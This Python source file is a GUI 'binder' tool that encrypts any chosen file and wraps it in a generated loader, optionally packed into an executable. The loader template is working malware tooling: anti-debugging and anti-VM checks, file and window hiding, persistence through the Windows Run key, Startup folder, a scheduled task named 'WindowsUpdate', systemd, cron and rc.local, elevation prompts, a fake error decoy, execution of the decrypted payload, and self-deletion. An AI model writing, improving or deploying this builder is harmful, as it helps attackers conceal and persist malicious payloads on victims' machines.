import os
import base64
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from cryptography.fernet import Fernet
import subprocess
import platform
import PyInstaller.__main__
import sys
import time
from pathlib import Path

class CrossPlatformBinder:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Ultimate Cross Platform Binder")
        self.window.geometry("700x800")
        
        # Apply Dark Theme
        self.style = ttk.Style()
        self.configure_dark_theme()
        
        main_frame = ttk.Frame(self.window, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Platform Detection
        self.current_os = platform.system()
        
        # File Selection
        file_group = ttk.LabelFrame(main_frame, text="File Selection", padding="5")
        file_group.pack(fill=tk.X, pady=5)
        
        self.file_entry = ttk.Entry(file_group)
        self.file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        ttk.Button(file_group, text="Browse", command=self.browse_file).pack(side=tk.RIGHT)
        
        # Output Type
        output_type_group = ttk.LabelFrame(main_frame, text="Output Type", padding="5")
        output_type_group.pack(fill=tk.X, pady=5)
        
        self.output_type = tk.StringVar(value="py")
        ttk.Radiobutton(output_type_group, text="Python (.py)", variable=self.output_type, value="py").pack(side=tk.LEFT)
        if self.current_os == "Windows":
            ttk.Radiobutton(output_type_group, text="Executable (.exe)", variable=self.output_type, value="exe").pack(side=tk.LEFT)
        else:
            ttk.Radiobutton(output_type_group, text="Binary (ELF)", variable=self.output_type, value="bin").pack(side=tk.LEFT)
        
        # Stealth Options
        stealth_group = ttk.LabelFrame(main_frame, text="Stealth Options", padding="5")
        stealth_group.pack(fill=tk.X, pady=5)
        
        self.hide_file_var = tk.BooleanVar()
        self.hide_process_var = tk.BooleanVar()
        self.startup_var = tk.BooleanVar()
        self.persistence_var = tk.BooleanVar()
        self.privilege_escalation_var = tk.BooleanVar()
        self.anti_vm_var = tk.BooleanVar()
        self.anti_debug_var = tk.BooleanVar()
        self.melt_var = tk.BooleanVar()
        
        ttk.Checkbutton(stealth_group, text="Hide File", variable=self.hide_file_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="Hide Process", variable=self.hide_process_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="Add to Startup", variable=self.startup_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="System Persistence", variable=self.persistence_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text=f"{'UAC Bypass' if self.current_os == 'Windows' else 'Root Escalation'}", 
                       variable=self.privilege_escalation_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="Anti-VM", variable=self.anti_vm_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="Anti-Debug", variable=self.anti_debug_var).pack(anchor=tk.W)
        ttk.Checkbutton(stealth_group, text="Self Destruct", variable=self.melt_var).pack(anchor=tk.W)
                # Advanced Options
        advanced_group = ttk.LabelFrame(main_frame, text="Advanced Options", padding="5")
        advanced_group.pack(fill=tk.X, pady=5)
        
        ttk.Label(advanced_group, text="Execution Delay (seconds):").pack(anchor=tk.W)
        self.delay_entry = ttk.Entry(advanced_group)
        self.delay_entry.pack(fill=tk.X, pady=2)
        self.delay_entry.insert(0, "0")
        
        # Error Message
        error_group = ttk.LabelFrame(main_frame, text="Fake Error Message", padding="5")
        error_group.pack(fill=tk.X, pady=5)
        
        ttk.Label(error_group, text="Error Title:").pack(anchor=tk.W)
        self.error_title = ttk.Entry(error_group)
        self.error_title.pack(fill=tk.X, pady=2)
        self.error_title.insert(0, "System Error")
        
        ttk.Label(error_group, text="Error Message:").pack(anchor=tk.W)
        self.error_message = ttk.Entry(error_group)
        self.error_message.pack(fill=tk.X, pady=2)
        self.error_message.insert(0, "Critical system error occurred")
        
        # Output Settings
        output_group = ttk.LabelFrame(main_frame, text="Output Settings", padding="5")
        output_group.pack(fill=tk.X, pady=5)
        
        ttk.Label(output_group, text="Output Name:").pack(anchor=tk.W)
        self.output_name = ttk.Entry(output_group)
        self.output_name.pack(fill=tk.X, pady=2)
        self.output_name.insert(0, "bound_file")
        
        # Build Button
        ttk.Button(main_frame, text="Create Bound File", command=self.bind_file, style="Accent.TButton").pack(pady=20)

    def configure_dark_theme(self):
        self.style.configure("TFrame", background="#1a1a1a")
        self.style.configure("TLabel", background="#1a1a1a", foreground="#ff0000")
        self.style.configure("TButton", background="#2d2d2d", foreground="#ff0000")
        self.style.configure("Accent.TButton", background="#ff0000", foreground="#ffffff")
        self.style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#ffffff")
        self.style.configure("TCheckbutton", background="#1a1a1a", foreground="#ff0000")
        self.style.configure("TRadiobutton", background="#1a1a1a", foreground="#ff0000")
        self.style.configure("TLabelframe", background="#1a1a1a", foreground="#ff0000")
        self.style.configure("TLabelframe.Label", background="#1a1a1a", foreground="#ff0000")
        
        self.window.configure(bg="#1a1a1a")

    def browse_file(self):
        filename = filedialog.askopenfilename(
            title="Select File to Bind",
            filetypes=(
                ("All files", "*.*"),
                ("Python files", "*.py"),
                ("Executable files", "*.exe")
            )
        )
        if filename:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)

    def generate_loader_code(self):
        return """
import os
import sys
import platform
import subprocess
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import time
import ctypes
import random
import tempfile
import shutil
import threading

CURRENT_OS = platform.system()

class StealthPayload:
    @staticmethod
    def check_debugging():
        if ANTI_DEBUG:
            try:
                if CURRENT_OS == "Windows":
                    if ctypes.windll.kernel32.IsDebuggerPresent():
                        return True
                else:
                    import re
                    with open('/proc/self/status') as f:
                        status = f.read()
                        if re.search(r'TracerPid:\\s+(?!0\\n)', status):
                            return True
            except:
                pass
        return False

    @staticmethod
    def check_vm():
        if ANTI_VM:
            vm_signs = ['VMware', 'VBox', 'QEMU', 'Virtual', 'KVM']
            try:
                if CURRENT_OS == "Linux":
                    with open('/proc/cpuinfo', 'r') as f:
                        cpu_info = f.read().lower()
                        return any(sign.lower() in cpu_info for sign in vm_signs)
                else:
                    import wmi
                    c = wmi.WMI()
                    for item in c.Win32_ComputerSystem():
                        return any(sign.lower() in item.Model.lower() for sign in vm_signs)
            except:
                pass
        return False

    @staticmethod
    def hide_file():
        try:
            if CURRENT_OS == "Windows":
                import win32con
                import win32api
                win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN)
            else:
                current_file = os.path.abspath(sys.executable)
                hidden_file = os.path.join(os.path.dirname(current_file), f".{os.path.basename(current_file)}")
                os.rename(current_file, hidden_file)
        except:
            pass

    @staticmethod
    def hide_process():
        try:
            if CURRENT_OS == "Windows":
                import win32gui
                import win32con
                hwnd = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            else:
                os.setpgrp()
        except:
            pass

    @staticmethod
    def add_persistence():
        try:
            if CURRENT_OS == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WindowsService', 0, winreg.REG_SZ, sys.executable)
                
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                shutil.copy2(sys.executable, startup_folder)
                
                subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdate', '/tr', sys.executable, '/sc', 'onlogon', '/rl', 'highest', '/f'], shell=True)
            else:
                home = os.path.expanduser('~')
                
                service_content = f'''[Unit]
Description=System Service
After=network.target

[Service]
ExecStart={sys.executable}
Restart=always

[Install]
WantedBy=multi-user.target
'''
                service_path = '/etc/systemd/system/system-service.service'
                try:
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    subprocess.run(['systemctl', 'enable', 'system-service'])
                except:
                    pass
                
                cron_cmd = f"@reboot {sys.executable}"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                
                rc_local = '/etc/rc.local'
                try:
                    with open(rc_local, 'a') as f:
                        f.write(f"\\n{sys.executable} &\\n")
                except:
                    pass
        except:
            pass

    @staticmethod
    def escalate_privileges():
        try:
            if CURRENT_OS == "Windows":
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
                    sys.exit()
            else:
                if os.geteuid() != 0:
                    subprocess.run(['sudo', sys.executable] + sys.argv)
                    sys.exit()
        except:
            pass

    @staticmethod
    def self_destruct():
        if MELT:
            try:
                temp_script = f'''
import os
import time
import sys

original_file = "{sys.executable}"
time.sleep(1)
try:
    os.remove(original_file)
except:
    pass
os.remove(__file__)
'''
                temp_file = os.path.join(tempfile.gettempdir(), f'cleanup_{random.randint(1000,9999)}.py')
                with open(temp_file, 'w') as f:
                    f.write(temp_script)
                
                if CURRENT_OS == "Windows":
                    subprocess.Popen(['pythonw', temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen(['python3', temp_file], start_new_session=True)
            except:
                pass

    @staticmethod
    def show_error():
        try:
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(ERROR_TITLE, ERROR_MESSAGE)
        except:
            pass

def main():
    time.sleep(DELAY)
    
    if StealthPayload.check_debugging() or StealthPayload.check_vm():
        sys.exit()
    
    if PRIVILEGE_ESCALATION:
        StealthPayload.escalate_privileges()
    
    if HIDE_FILE:
        StealthPayload.hide_file()
    
    if HIDE_PROCESS:
        StealthPayload.hide_process()
    
    if STARTUP:
        StealthPayload.add_persistence()
    
    if SHOW_ERROR:
        threading.Thread(target=StealthPayload.show_error).start()
    
    try:
        exec(Fernet(KEY).decrypt(PAYLOAD))
    except:
        pass
    
    if MELT:
        StealthPayload.self_destruct()

if __name__ == '__main__':
    main()
"""

    def create_executable(self, py_file):
        if self.current_os == "Windows":
            PyInstaller.__main__.run([
                '--onefile',
                '--noconsole',
                '--hidden-import=win32gui',
                '--hidden-import=win32con',
                '--hidden-import=win32api',
                '--hidden-import=wmi',
                '--hidden-import=cryptography',
                '--hidden-import=pycryptodome',
                py_file
            ])
        else:  # Linux
            PyInstaller.__main__.run([
                '--onefile',
                '--noconsole',
                '--hidden-import=cryptography',
                '--hidden-import=pycryptodome',
                py_file
            ])

    def bind_file(self):
        try:
            input_file = self.file_entry.get()
            if not input_file or not os.path.exists(input_file):
                messagebox.showerror("Error", "Select a valid file!")
                return
            
            key = Fernet.generate_key()
            f = Fernet(key)
            
            with open(input_file, 'rb') as file:
                encrypted_data = f.encrypt(file.read())
            
            loader_code = self.generate_loader_code()
            loader_code = loader_code.replace('KEY', repr(key))
            loader_code = loader_code.replace('PAYLOAD', repr(encrypted_data))
            loader_code = loader_code.replace('HIDE_FILE', str(self.hide_file_var.get()))
            loader_code = loader_code.replace('HIDE_PROCESS', str(self.hide_process_var.get()))
            loader_code = loader_code.replace('STARTUP', str(self.startup_var.get()))
            loader_code = loader_code.replace('PRIVILEGE_ESCALATION', str(self.privilege_escalation_var.get()))
            loader_code = loader_code.replace('ANTI_VM', str(self.anti_vm_var.get()))
            loader_code = loader_code.replace('ANTI_DEBUG', str(self.anti_debug_var.get()))
            loader_code = loader_code.replace('MELT', str(self.melt_var.get()))
            loader_code = loader_code.replace('ERROR_TITLE', repr(self.error_title.get()))
            loader_code = loader_code.replace('ERROR_MESSAGE', repr(self.error_message.get()))
            loader_code = loader_code.replace('DELAY', self.delay_entry.get())
            loader_code = loader_code.replace('SHOW_ERROR', 'True')
            
            output_name = self.output_name.get()
            py_file = f"{output_name}.py"
            with open(py_file, 'w') as f:
                f.write(loader_code)
            
            if self.output_type.get() in ["exe", "bin"]:
                self.create_executable(py_file)
                os.remove(py_file)  # Remove .py file
                ext = ".exe" if self.current_os == "Windows" else ""
                messagebox.showinfo("Success", f"File bound successfully as {output_name}{ext}")
            else:
                messagebox.showinfo("Success", f"File bound successfully as {py_file}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Binding failed: {str(e)}")

    def run(self):
        self.window.mainloop()

if __name__ == "__main__":
    binder = CrossPlatformBinder()
    binder.run()


